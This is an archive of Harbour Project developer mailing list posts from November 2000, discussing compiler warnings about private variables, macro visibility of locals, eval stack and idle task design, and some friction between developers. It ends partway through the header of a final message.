Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23CFB3.B1B5129D@libero.it>
Message-ID: <3A23E098.18653.44E55C@localhost>

Hi Maurilio

It seem I remember something like with Cl*pper where (depending 
of the compiler param) you have to declare it twice, first with 

MEMVAR mypriv
 
> procedure main()
>         test()
> return
> 
> static function test()
> 
>         local test
>         private mypriv
> 
>         mypriv := "1"  // Now the compiler 'know' it's a memvar ...
> 
> return 0

err. perhaps is it also a compiler param to do so with Harbour ...


see you,

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Tue Nov 28 10:52:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 10:52:02 2000
Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23CFB3.B1B5129D@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEKDDHAA.ron@profit-master.com>

Maurilio,

This is a correct warning. You should change:

mypriv := "1"

to:

M->mypriv := "1"

or add:

MEMVAR mypriv

Just above or below the LOCAL declaration.

Ron

> Jean,
> 
> look at this:
> 
> (E:\harbour\test)e:\harbour\bin\harbour -n -w -Ie:\harbour\include
> test.prg
> Harbour Compiler 0.35i (Build 35) (2000.10.23) (SimpLex)
> Copyright 1999-2000, http://www.harbour-project.org
> Compiling 'test.prg'...
> test.prg(10) Warning W0001  Ambiguous reference: 'MYPRIV'
> Lines 16, Functions/Procedures 2
> Generating C source output to 'test.c'... Done.
> 
> 
> for this little program:
> 
> 
> procedure main()
>         test()
> return
> 
> static function test()
> 
>         local test
>         private mypriv
> 
>         mypriv := "1"
> 
> return 0
> 
> 
> regards.
> 
> 
> 
> jflefebv@mafact.com ha scritto:
> > 
> > Hi Maurilio,
> > 
> > Could you please check the PPO output, your information is really
> > strange as a method is never else than a static function. So if this
> > problem exist within a method you should be able to reproduce it
> > within any (static) function.
> > 
> > See you,
> > 
> > > If I declare some private variables inside a method I get this error:
> > >
> > > Copyright 1999-2000, http://www.harbour-project.org
> > > Compiling 'farmaq.prg'...
> > > Lines 96, Functions/Procedures 2
> > > Generating C source output to 'farmaq.c'... Done.
> > > Compiling 'tfarmaq.prg'...
> > > tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> > > tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > Lines 350, Functions/Procedures 13 Generating C source output to
> > > 'tfarmaq.c'... Done. Compiling 'tb2html.prg'...
> > >
> > >
> > > regards.
> > >
> > > --
> > >  __________
> > > |  |  | |__| md2520@mclink.it
> > > |_|_|_|____| Team OS/2 Italia
> > > _______________________________________________
> > > Harbour mailing list
> > > Harbour@lists.harbour-project.org
> > > http://www.matrixlist.com/mailman/listinfo/harbour
> > >
> > > Thank you for participating in The Harbour Project.  Be sure to check
> > > http://www.Harbour-Project.org
> > >
> > >
> > 
> > Best regards,
> > 
> > J. Lefebvre <jflefebv@mafact.com>
> > Mafact SA/NV
> > Belgium
> > (See us at http://www.mafact.com)
> > jflefebv@mafact.com
> > 
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> > 
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> 
> -- 
>  __________                   
> |  |  | |__| md2520@mclink.it 
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 

From harbour@lists.harbour-project.org  Tue Nov 28 11:12:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Tue Nov 28 11:12:02 2000
Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23C7A3.4E258353@libero.it>; from maurilio.longo@libero.it on Tue, Nov 28, 2000 at 03:56:35PM +0100
References: <3A23AA0D.E6862AD8@libero.it> <20001128144014.T26952@hagbard.davep.org> <3A23C7A3.4E258353@libero.it>
Message-ID: <20001128154546.U26952@hagbard.davep.org>

[Quotes rearranged to have a more logical flow]

On Tue, Nov 28, 2000 at 03:56:35PM +0100, Maurilio Longo wrote:

> Dave Pearson ha scritto:
> > 
> > On Tue, Nov 28, 2000 at 01:50:21PM +0100, Maurilio Longo wrote:
> > > If I declare some private variables inside a method I get this error:
> > >
> > > Compiling 'tfarmaq.prg'...
> > > tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> > > tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > Lines 350, Functions/Procedures 13
> > > Generating C source output to 'tfarmaq.c'... Done.
> > 
> > They're warnings, not errors. What problem do you think you're
> > experiencing?
> 
> I don't have problems, but I think I should not get a warning when I
> declare a private variable.

You should if you asked for warnings (as with CA-Clipper). Are you saying
you didn't ask for warnings? It's actually hard to tell what you're doing
because you've not said anything about how you actually made the call to
harbour.

When reporting problems on a developer's mailing list it's really a good
idea to reduce the problem to the smallest possible example you can create
and then post *all* the information about it.

For example, take this program:

,----[ foo.prg ]
| Function Main()
| 
|    Private cPrivate := "I'm a private"
|    
|    ? cPrivate
| 
| Return( NIL )
`----

As you can see, I'm using a private. I can compile it without asking for
warnings:

,----
| davep@hagbard:~/temp$ harbour foo
| Harbour Compiler 0.34 (Build 34) (2000.06.02)
| Copyright 1999-2000, http://www.harbour-project.org
| Compiling 'foo.prg'...
| Lines 12, Functions/Procedures 2
| Generating C source output to 'foo.c'... Done.
`----

and I don't get any warnings. Or, I can ask for warnings:

,----
| davep@hagbard:~/temp$ harbour foo -w
| Harbour Compiler 0.34 (Build 34) (2000.06.02)
| Copyright 1999-2000, http://www.harbour-project.org
| Compiling 'foo.prg'...
| foo.prg(3) Warning W0001  Ambiguous reference: 'CPRIVATE'
| foo.prg(5) Warning W0001  Ambiguous reference: 'CPRIVATE'
| Lines 12, Functions/Procedures 2
| Generating C source output to 'foo.c'... Done.
`----

and I'll get them. Obviously, I can modify my code to remove the warnings
even though I've asked for them:

,----
| davep@hagbard:~/temp$ cat foo.prg
| Function Main()
| Memvar cPrivate
| 
|    Private cPrivate := "I'm a private"
| 
|    ? cPrivate
| 
| Return( NIL )
| 
| davep@hagbard:~/temp$ harbour foo -w
| Harbour Compiler 0.34 (Build 34) (2000.06.02)
| Copyright 1999-2000, http://www.harbour-project.org
| Compiling 'foo.prg'...
| Lines 13, Functions/Procedures 2
| Generating C source output to 'foo.c'... Done.
`----

or, if I really wanted, I could ask the compiler to do that job for me:

,----
| davep@hagbard:~/temp$ cat foo.prg
| Function Main()
| 
|    Private cPrivate := "I'm a private"
| 
|    ? cPrivate
| 
| Return( NIL )
| 
| davep@hagbard:~/temp$ harbour foo -aw
| Harbour Compiler 0.34 (Build 34) (2000.06.02)
| Copyright 1999-2000, http://www.harbour-project.org
| Compiling 'foo.prg'...
| Lines 12, Functions/Procedures 2
| Generating C source output to 'foo.c'... Done.
`----

but that's nothing to do with harbour development and everything to do with
knowing Clipper (the language) and reading the command line options for
harbour. That's probably a conversation better had in somewhere like
<URL:news:comp.lang.clipper> or on the harbour users development list.

So, to help the harbour developers, perhaps you can construct a small
example like I did, document your platform, your harbour version, the
command line you used, the output you expected (and why) and the output you
actually got (and why you think it's wrong).

Personally I suspect you asked for warnings and *didn't* declare the
private. Note that PRIVATE *creates* a private but it doesn't *declare* it,
that's what Memvar does.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Tue Nov 28 11:30:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 11:30:03 2000
Subject: [Harbour] doubly-detached locals
In-Reply-To: <3A23BC9E.8268FC38@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEKDDHAA.ron@profit-master.com>

Maurilio,

You sample is not clear enough (the block has no reference to cCod), but I
suspect that the problem is a local can *not* be referenced from a text
representation of a block, because it is evaluated by the Macro Operator.
You *must* use a Private or Public for such purpose.

LOCALs are *not* visible from macros, but MEMVARs are.

Ron

> Ryszard,
>
> sorry to bother, but this line of code gives me an error (variable does
> not exist) if executed:
>
> cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
> "}", hb_OSNewLine())))
>
> Note that I get a textual SQL query from a table, this query is
> converted to a codeblock that when evaluated references locals declared
> inside a method.
>
> I need to use private variables to make it work, if I use locals it
> gives an error, as I said.
>
> Is this a known issue?
>
> regards.
>
> PS. A little clearer:
>
> method xyz() class myclass
>
> local cCod := "1234"
>
> cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
> "}", hb_OSNewLine())))
>
>
> return Self
>
>
> cQuery is something like "SELECT * FROM IMS WHERE cod=cCod" and becomes:
>
> "SELECT * FROM IMS WHERE cod=1234"
>
> if cCod is a local I get an error. I don't get it if it is a private.
> Maybe is a mistake on my side, but I think that locals should be ok in
> this case.
>
>
>
> Ryszard Glab ha scritto:
> >
> > On 26 Nov 2000, at 0:03, Brian Hays wrote:
> >
> > > I have some clipper code that I had to change to get to work right in
> > > Harbour. Basically, it seems that in Harbour a codeblock defined in a
> > > LOCAL statement can only reference locals already declared above it.
> > > In Clipper, the referenced variables could successfully be declared in
> > > a following LOCAL declaration.
> >
> >   It is a documented Clipper incompatibility: see doc/codeblock.txt
> > We can fix it later after beta release.
> >
> > Regards, Ryszard
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
>
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Tue Nov 28 11:34:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 11:34:02 2000
Subject: [Harbour] private inside a method gives a warning
References: <3A23AA0D.E6862AD8@libero.it> <20001128144014.T26952@hagbard.davep.org> <3A23C7A3.4E258353@libero.it> <20001128154546.U26952@hagbard.davep.org>
Message-ID: <3A23DEA9.20134429@libero.it>

Sorry Dave,

I've seen every kind of weirdness lately and this time I simply forgot
to double check (and assumed private xx was enough).

regards.



Dave Pearson ha scritto:
> 
> [Quotes rearranged to have a more logical flow]
> 
> On Tue, Nov 28, 2000 at 03:56:35PM +0100, Maurilio Longo wrote:
> 
> > Dave Pearson ha scritto:
> > >
> > > On Tue, Nov 28, 2000 at 01:50:21PM +0100, Maurilio Longo wrote:
> > > > If I declare some private variables inside a method I get this error:
> > > >
> > > > Compiling 'tfarmaq.prg'...
> > > > tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> > > > tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > > tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > > > Lines 350, Functions/Procedures 13
> > > > Generating C source output to 'tfarmaq.c'... Done.
> > >
> > > They're warnings, not errors. What problem do you think you're
> > > experiencing?
> >
> > I don't have problems, but I think I should not get a warning when I
> > declare a private variable.
> 
> You should if you asked for warnings (as with CA-Clipper). Are you saying
> you didn't ask for warnings? It's actually hard to tell what you're doing
> because you've not said anything about how you actually made the call to
> harbour.
> 
> When reporting problems on a developer's mailing list it's really a good
> idea to reduce the problem to the smallest possible example you can create
> and then post *all* the information about it.
> 
> For example, take this program:
> 
> ,----[ foo.prg ]
> | Function Main()
> |
> |    Private cPrivate := "I'm a private"
> |
> |    ? cPrivate
> |
> | Return( NIL )
> `----
> 
> As you can see, I'm using a private. I can compile it without asking for
> warnings:
> 
> ,----
> | davep@hagbard:~/temp$ harbour foo
> | Harbour Compiler 0.34 (Build 34) (2000.06.02)
> | Copyright 1999-2000, http://www.harbour-project.org
> | Compiling 'foo.prg'...
> | Lines 12, Functions/Procedures 2
> | Generating C source output to 'foo.c'... Done.
> `----
> 
> and I don't get any warnings. Or, I can ask for warnings:
> 
> ,----
> | davep@hagbard:~/temp$ harbour foo -w
> | Harbour Compiler 0.34 (Build 34) (2000.06.02)
> | Copyright 1999-2000, http://www.harbour-project.org
> | Compiling 'foo.prg'...
> | foo.prg(3) Warning W0001  Ambiguous reference: 'CPRIVATE'
> | foo.prg(5) Warning W0001  Ambiguous reference: 'CPRIVATE'
> | Lines 12, Functions/Procedures 2
> | Generating C source output to 'foo.c'... Done.
> `----
> 
> and I'll get them. Obviously, I can modify my code to remove the warnings
> even though I've asked for them:
> 
> ,----
> | davep@hagbard:~/temp$ cat foo.prg
> | Function Main()
> | Memvar cPrivate
> |
> |    Private cPrivate := "I'm a private"
> |
> |    ? cPrivate
> |
> | Return( NIL )
> |
> | davep@hagbard:~/temp$ harbour foo -w
> | Harbour Compiler 0.34 (Build 34) (2000.06.02)
> | Copyright 1999-2000, http://www.harbour-project.org
> | Compiling 'foo.prg'...
> | Lines 13, Functions/Procedures 2
> | Generating C source output to 'foo.c'... Done.
> `----
> 
> or, if I really wanted, I could ask the compiler to do that job for me:
> 
> ,----
> | davep@hagbard:~/temp$ cat foo.prg
> | Function Main()
> |
> |    Private cPrivate := "I'm a private"
> |
> |    ? cPrivate
> |
> | Return( NIL )
> |
> | davep@hagbard:~/temp$ harbour foo -aw
> | Harbour Compiler 0.34 (Build 34) (2000.06.02)
> | Copyright 1999-2000, http://www.harbour-project.org
> | Compiling 'foo.prg'...
> | Lines 12, Functions/Procedures 2
> | Generating C source output to 'foo.c'... Done.
> `----
> 
> but that's nothing to do with harbour development and everything to do with
> knowing Clipper (the language) and reading the command line options for
> harbour. That's probably a conversation better had in somewhere like
> <URL:news:comp.lang.clipper> or on the harbour users development list.
> 
> So, to help the harbour developers, perhaps you can construct a small
> example like I did, document your platform, your harbour version, the
> command line you used, the output you expected (and why) and the output you
> actually got (and why you think it's wrong).
> 
> Personally I suspect you asked for warnings and *didn't* declare the
> private. Note that PRIVATE *creates* a private but it doesn't *declare* it,
> that's what Memvar does.
> 
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 11:39:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Tue Nov 28 11:39:02 2000
Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23CFB3.B1B5129D@libero.it>; from maurilio.longo@libero.it on Tue, Nov 28, 2000 at 04:30:59PM +0100
References: <3A23CDF4.29775.19B6B06@localhost> <3A23CFB3.B1B5129D@libero.it>
Message-ID: <20001128161815.W26952@hagbard.davep.org>

On Tue, Nov 28, 2000 at 04:30:59PM +0100, Maurilio Longo wrote:

> (E:\harbour\test)e:\harbour\bin\harbour -n -w -Ie:\harbour\include

You're getting what you asked for. The "-w" in the above means that you want
to be warned when you're using undeclared memory variables.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Tue Nov 28 11:46:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 11:46:01 2000
Subject: [Harbour] doubly-detached locals
References: <LOBBKAFMMFGJIKLMEPAKKEKDDHAA.ron@profit-master.com>
Message-ID: <3A23E14B.A1E020B7@libero.it>

Ron, 

thanks.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> You sample is not clear enough (the block has no reference to cCod), but I
> suspect that the problem is a local can *not* be referenced from a text
> representation of a block, because it is evaluated by the Macro Operator.
> You *must* use a Private or Public for such purpose.
> 
> LOCALs are *not* visible from macros, but MEMVARs are.
> 
> Ron
> 
> > Ryszard,
> >
> > sorry to bother, but this line of code gives me an error (variable does
> > not exist) if executed:
> >
> > cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
> > "}", hb_OSNewLine())))
> >
> > Note that I get a textual SQL query from a table, this query is
> > converted to a codeblock that when evaluated references locals declared
> > inside a method.
> >
> > I need to use private variables to make it work, if I use locals it
> > gives an error, as I said.
> >
> > Is this a known issue?
> >
> > regards.
> >
> > PS. A little clearer:
> >
> > method xyz() class myclass
> >
> > local cCod := "1234"
> >
> > cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
> > "}", hb_OSNewLine())))
> >
> >
> > return Self
> >
> >
> > cQuery is something like "SELECT * FROM IMS WHERE cod=cCod" and becomes:
> >
> > "SELECT * FROM IMS WHERE cod=1234"
> >
> > if cCod is a local I get an error. I don't get it if it is a private.
> > Maybe is a mistake on my side, but I think that locals should be ok in
> > this case.
> >
> >
> >
> > Ryszard Glab ha scritto:
> > >
> > > On 26 Nov 2000, at 0:03, Brian Hays wrote:
> > >
> > > > I have some clipper code that I had to change to get to work right in
> > > > Harbour. Basically, it seems that in Harbour a codeblock defined in a
> > > > LOCAL statement can only reference locals already declared above it.
> > > > In Clipper, the referenced variables could successfully be declared in
> > > > a following LOCAL declaration.
> > >
> > >   It is a documented Clipper incompatibility: see doc/codeblock.txt
> > > We can fix it later after beta release.
> > >
> > > Regards, Ryszard
> > > _______________________________________________
> > > Harbour mailing list
> > > Harbour@lists.harbour-project.org
> > > http://www.matrixlist.com/mailman/listinfo/harbour
> > >
> > > Thank you for participating in The Harbour Project.  Be sure to check
> > > http://www.Harbour-Project.org
> >
> > --
> >  __________
> > |  |  | |__| md2520@mclink.it
> > |_|_|_|____| Team OS/2 Italia
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> >
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 12:31:01 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Tue Nov 28 12:31:01 2000
Subject: [Harbour] doubly-detached locals
In-Reply-To: <3A23BC9E.8268FC38@libero.it>; from maurilio.longo@libero.it on Tue, Nov 28, 2000 at 03:09:34PM +0100
References: <3A23C80D.3367.42CBF82@localhost> <3A23BC9E.8268FC38@libero.it>
Message-ID: <20001128164358.Y26952@hagbard.davep.org>

On Tue, Nov 28, 2000 at 03:09:34PM +0100, Maurilio Longo wrote:

> Note that I get a textual SQL query from a table, this query is converted
> to a codeblock that when evaluated references locals declared inside a
> method.
> 
> I need to use private variables to make it work, if I use locals it
> gives an error, as I said.
> 
> Is this a known issue?

It's not just a known issue, it's a feature of the language and has been
since Clipper 5.0 introduced the concept of lexical scope using LOCAL and
STATIC.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Tue Nov 28 12:53:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 12:53:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random   gpfs)
In-Reply-To: <200011271224_MC2-BC30-EE6C@compuserve.com>
Message-ID: <3A23FFE7.31028.506E9F9@localhost>

On 27 Nov 2000, at 12:24, John Skelton wrote:

> IAC, as I pointed out, Harbour has many non-ANSI functions in it.  I
> see no particular problem with getting a good stack implementation in
> return for a small amount more of such functions.

  Yes, they are handling platform specific tasks when there is no 
other possibility.

> "Additionally, these functions are not tested widely"
> 
> You're kidding, right?  What evidence do you have for that claim?

  If they are used so often then why we didn't use them from the very 
beginning? Have we (harbour developers) any experience with these 
functions?

> 
> "OS specific solution can give better performance however at 
> the cost of decreased stability"
> 
> Again, what evidence do you have?

  This is my impression after reading dejanews.com archives about 
VirtualAlloc.

> It's a slow and bloated solution.  I don't regard it as viable.  OTOH,
> I don't intend to use it. :-)

  Well we will see if this ,,bloated'' solution is slower then 
handling of page faults caused by virtual memory usage.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 13:08:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 13:08:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas    <ron@profit-master.com>
In-Reply-To: <200011271224_MC2-BC30-EE6B@compuserve.com>
Message-ID: <3A240370.6663.514BB8F@localhost>

On 27 Nov 2000, at 12:24, John Skelton wrote:

> That is _platform dependent_.  It would not apply with, for example, a
> GUI Windows app.  Such an app will never call INKEY (or related wait
> state thing).

  We are developing a Clipper compatible compiler - not a GUI 
application. Any GUI layer can provide such replacement if needed. 
Previous idle code was ready to be used in such replacement - I am 
not sure if current code will fit.

> However, people with GUI winapps may want to have low-priority
> background activities (or the "events" also mentioned), even if they
> are implemented crudely.  So, if Harbour is to have such things they
> should be added properly.

  We are talking about differnt things currently. Idle tasks can be 
called when an _application_ have nothing more interesting to do. 
Events and low-priority tasks called from VM loop have a quite 
different usage and cannot be mixed with idle tasks. However both 
should be implemented in a proper way.

> BTW, In any decent OS, it is the OS which will deal with things like
> detecting and buffering keystrokes.  It is a kind of procedural
> hangover that Clipper & now Harbour even have a way to be "keystroke
> checking".  Also, the Harbour app may be "in non-productive state",
> but generally the OS is _not_, and you do it no favours by checking in
> a loop the way you refer to.  (You are no doubt aware of the problems
> & patches needed with Clipper and OS/2, NT, etc.)  You also interfere
> with low-power appliances.  Any such code should definitely be
> separated out from the main body of Harbour and its use strongly
> discouraged.

  I agree that code for keystrokes should be separated but its use 
depends on the application architecture and OS used. If I am not 
mistaken then only ,,GUI OSes'' offers messagess and events to handle 
keystrokes. If we want to port old Clipper applications then we have 
offer such possibility. Do you have a better solution for systems 
that don't offer such keystroke handling? Again wwe are not targeting 
any particular decent OS - we are targeting as many OS as possible.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 13:23:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 13:23:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random    gpfs)
In-Reply-To: <200011280550_MC2-BC54-8AA3@compuserve.com>
Message-ID: <3A2406F9.5228.522873D@localhost>

On 28 Nov 2000, at 5:50, John Skelton wrote:

> My point remains: surely we want a good stack implementation.  One
> that doesn't move the stack around!  And as I just posted yesterday
> that should be stack_s_, being both Eval stack & CPU stack.

  Sorry, but what is a relation of CPU stack with the eval stack? We 
are not managing any CPU stack so far. This work is left for C 
compiler. Do we have any missings here?

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 13:34:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 13:34:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEJHDHAA.ron@profit-master.com>
References: <3A223FA2.31487.3F5298E@localhost>
Message-ID: <3A240972.26942.52C3021@localhost>

On 27 Nov 2000, at 12:04, Ron Pinkas wrote:

> This "complex dependency" was now replaced with a call to
> hb_idleReset(). OTOH, while I was drafting this message, you just
> added U*x CPU release support, and somehow it founds its way to
> inkey.c !!! Didn't you just warned us against mixing Idle Logic with
> inkey???

  I have removed a bug from inkey.c code. clock() function in Linux 
reports an amount of time that an _application_ is run instead of an 
amount of time elapsed. This caused that INKEY(<nSeconds>) had 
measured a time incorrectly because, after nanosleep() calls, the 
time spend by the application dropped to almost zero.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 14:19:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 14:19:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEJHDHAA.ron@profit-master.com>
References: <3A223FA2.31487.3F5298E@localhost>
Message-ID: <3A241263.15776.54F2052@localhost>

On 27 Nov 2000, at 12:04, Ron Pinkas wrote:

> This kind of misleading information will not serve you well!
> 
> Please tell me, what is your object here, and what is your proposed
> change or fix?

  Just try to delete an idle task from inside of idle task and see 
what will happen. And next please report where I wrote a misleading 
information.

> Let's assume for a moment, that my implementation was wrong, is that
> the way to address it? Did I not invite input? Did I decline or object
> any suggestion?

   Have you read the message you are responding? I have clearly wrote 
why your solution was wrong. Read it again and again. This is not the 
first time when you are commiting some code that is changing some 
behaviour without prior discussion. This was not a simple bug fix.

> Few weeks back I fixed _GET_() support. You promptly changed it in
> Flex build, even though it was and still is 100% correct, and 100%
> Clipper compatible. In your rush, you broke GET support. First it
> didn't even support macros, and  till today it still does not support
> objects data (try tests/testget.prg, change the picture string and
> skip back to the first get). When that happened, I offered facts and
> assistance, and not personal attacks.

  Yes, Ron. Showing you the correct behaviour for idle tasks and your 
bugs in idle implementation is a personal attack. I can live with 
this.
 _GET_ support in flex version is not finished yet. Simplex support 
is not compatible with Clipper. Clipper is not using a preprocessor 
to supply a set/get codeblock (this is the reason why I have removed 
it initially from the preprocessor). I cannot predict now if this 
will cause problems in user defined GET implementation. Your solution 
is again breaking a modularization - it is placed in Simplex, bison 
and preprocessor. Flex solution is placed in the expression optimizer 
only.

> I sincerely respect your contribution to Harbour, and I hope you will
> learn to respect mine. It appears to me you simply refuse accepting
> that I'm capable of, did, do, and will continue contributing to
> Harbour. Please let's find a way to co-exist, in a productive way.

  Because I want a perfect harbour then I point wrong (in my opinion) 
solutions regardless their author. We can discuss them always. If you 
are receiving them as personal attacks then it is your problem.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 14:20:05 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 14:20:05 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEJHDHAA.ron@profit-master.com>
References: <3A223FA2.31487.3F5298E@localhost>
Message-ID: <3A241446.31670.5567DE2@localhost>

On 27 Nov 2000, at 12:04, Ron Pinkas wrote:

> For the benefit of anyone interested here is the "complex dependency"
> Ryszard was referring to:
> 
> <"complex dependency">
>    if( hb_vm_uiIdleTask == hb_vm_uiIdleMaxTask )
>    {
>       hb_vm_uiIdleTask = 0;
>       hb_vm_bCollectGarbage = TRUE;
>    }
> </"complex dependency">

  ROTFL :)

Regards, Ryszard


From harbour@lists.harbour-project.org  Tue Nov 28 14:30:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 28 14:30:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A22D8FF.25781.5298135@localhost>
References: <200011271814.eARIEuG29680@thor.parrett.net> <LOBBKAFMMFGJIKLMEPAKKEJEDHAA.ron@profit-master.com>
Message-ID: <200011281929.eASJTRr06629@thor.parrett.net>

** Reply to message from "Phil Barnett" <midnight@the-oasis.net> on
Mon, 27 Nov 2000 21:58:23 -0500

> Nothing as long as the default condition works EXACTLY the way it 
> always has. Anything less than existing capability runs against the 
> original goals of the Harbour project.

When I changed the new _SET_IDLEREPEAT code to match the SET coding
conventions, I also set it to default to TRUE, so it will continue to
behave like it used to, unless you explicitly set it to not repeat.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 28 14:32:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 28 14:32:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEJNDHAA.ron@profit-master.com>
References: <3A22D8FF.25781.5298135@localhost>
Message-ID: <200011281931.eASJVdr06820@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 19:54:11 -0800

> BTW, I have no objection to this, but for the sake of pedantry I must
> insist, that including NanForum Toolkit compatibility, was *not* part the
> original goals of the Harbour Project.

Which is why it got moved to the contrib directory tree quite some time
ago. Nothing in contrib is part of the Harbour core.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 28 14:48:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Tue Nov 28 14:48:02 2000
